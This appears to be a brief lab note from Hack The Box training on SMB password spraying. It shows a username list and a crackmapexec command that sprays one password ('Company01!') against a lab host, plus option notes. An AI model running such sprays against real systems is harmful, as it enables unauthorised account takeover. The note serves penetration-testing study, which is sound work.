# Userlist
```shell-session
nchiato@htb[/htb]$ cat /tmp/userlist.txt

Administrator
jrodriguez 
admin
<SNIP>
jurena
```
# Spray
```shell-session
nchiato@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

- Continue even after found `-- continue-on-success`
- non domain user `--local-auth`
